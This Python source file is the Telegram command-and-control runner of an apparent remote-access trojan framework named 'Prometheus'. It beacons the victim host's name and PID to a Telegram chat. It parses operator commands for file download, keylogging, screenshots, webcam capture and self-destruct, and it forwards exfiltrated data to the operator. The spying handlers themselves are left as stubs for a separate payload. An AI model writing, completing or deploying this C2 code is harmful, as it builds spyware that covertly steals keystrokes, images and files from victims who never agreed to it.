"""
Telegram Bot Runner
Handles the bot initialization and message processing loop.
"""

import os
import json
import time
import threading
import logging
from typing import Dict, Any, Optional, Callable

from .c2_telegram import TelegramBackend
from .c2_interface import C2Manager, C2Message, MessageType
from .engine import Engine


class TelegramRunner:
    """
    Runs the Telegram bot and manages the interaction with the framework.
    """

    def __init__(self, engine: Engine, config: Dict[str, Any]):
        self.engine = engine
        self.config = config
        self.logger = logging.getLogger(__name__)

        # Extract Telegram config
        self.bot_token = config.get("telegram_bot_token", "")
        self.chat_id = config.get("telegram_chat_id", "")
        self.allowed_chat_ids = config.get("telegram_allowed_chat_ids", [])

        if not self.bot_token or not self.chat_id:
            raise ValueError("Telegram bot token and chat ID are required")

        # Initialize the C2 manager
        self.c2_manager = C2Manager()

        # Register Telegram backend
        self.telegram_backend = TelegramBackend(
            bot_token=self.bot_token,
            chat_id=self.chat_id,
            allowed_chat_ids=self.allowed_chat_ids
        )
        self.c2_manager.register_backend(self.telegram_backend, primary=True)

        # Register message handlers
        self.c2_manager.register_handler(MessageType.COMMAND, self._handle_command)
        self.c2_manager.register_handler(MessageType.RESPONSE, self._handle_response)
        self.c2_manager.register_handler(MessageType.DATA, self._handle_data)

        self._running = False
        self._command_handlers: Dict[str, Callable] = {}

    def initialize(self) -> bool:
        """Initialize the Telegram bot and C2 system."""
        try:
            self.logger.info("Initializing Telegram C2 backend...")
            if not self.c2_manager.initialize_all():
                self.logger.error("Failed to initialize C2 backends")
                return False

            self.logger.info(f"Telegram C2 initialized for chat ID: {self.chat_id}")
            self._running = True

            # Send startup notification
            startup_msg = (
                f"🚀 <b>Prometheus Framework Online</b>\n\n"
                f"Version: {self.engine.config.get('version', '1.0.0')}\n"
                f"Host: {__import__('socket').gethostname()}\n"
                f"PID: {os.getpid()}\n"
                f"Chat ID: {self.chat_id}"
            )
            self.c2_manager.send_message(C2Message(MessageType.STATUS, startup_msg))

            return True

        except Exception as e:
            self.logger.error(f"Failed to initialize Telegram runner: {e}")
            return False

    def run(self):
        """Run the bot polling loop."""
        if not self._running:
            self.initialize()

        self.logger.info("Telegram bot is running. Press Ctrl+C to stop.")

        try:
            while self._running:
                # Poll for incoming messages
                self.c2_manager.poll_messages(timeout=5)

                # Check for commands from the engine
                self._process_engine_commands()

                time.sleep(1)

        except KeyboardInterrupt:
            self.logger.info("Shutting down...")
        finally:
            self.close()

    def _process_engine_commands(self):
        """Process commands from the engine that need to be sent to the C2."""
        # This is where you'd check for commands from the payload
        pass

    def _handle_command(self, message: C2Message):
        """Handle incoming commands from Telegram."""
        content = message.content
        metadata = message.metadata

        self.logger.info(f"Received command: {content[:50]}...")

        # Parse command
        if content.startswith("DOWNLOAD:"):
            file_path = content[9:].strip()
            self._handle_download_command(file_path, metadata)
        elif content.startswith("KEYLOG:"):
            action = content[7:].strip()
            self._handle_keylog_command(action, metadata)
        elif content == "SCREENSHOT":
            self._handle_screenshot_command(metadata)
        elif content == "WEBCAM":
            self._handle_webcam_command(metadata)
        elif content == "KILL":
            self._handle_kill_command(metadata)
        elif content.startswith("USER_MSG:"):
            user_msg = content[9:].strip()
            self._handle_user_message(user_msg, metadata)

    def _handle_response(self, message: C2Message):
        """Handle responses from the payload."""
        content = message.content
        self.logger.info(f"Response from payload: {content[:50]}...")

        # Forward to Telegram
        self.c2_manager.send_message(message)

    def _handle_data(self, message: C2Message):
        """Handle data exfiltration messages."""
        content = message.content
        self.logger.info(f"Data exfil received: {content[:50]}...")

        # Forward to Telegram
        self.c2_manager.send_message(message)

    # --- Command Handlers ---

    def _handle_download_command(self, file_path: str, metadata: Dict[str, Any]):
        """Handle file download request."""
        # This would be implemented on the payload side
        pass

    def _handle_keylog_command(self, action: str, metadata: Dict[str, Any]):
        """Handle keylogger command."""
        # This would be implemented on the payload side
        pass

    def _handle_screenshot_command(self, metadata: Dict[str, Any]):
        """Handle screenshot request."""
        # This would be implemented on the payload side
        pass

    def _handle_webcam_command(self, metadata: Dict[str, Any]):
        """Handle webcam request."""
        # This would be implemented on the payload side
        pass

    def _handle_kill_command(self, metadata: Dict[str, Any]):
        """Handle self-destruct command."""
        self.logger.warning("Self-destruct command received!")
        self._running = False
        self.close()

    def _handle_user_message(self, message: str, metadata: Dict[str, Any]):
        """Handle user message."""
        # This would be implemented on the payload side
        pass

    def close(self):
        """Close the bot and cleanup."""
        self._running = False
        self.c2_manager.close_all()
        self.logger.info("Telegram runner closed")
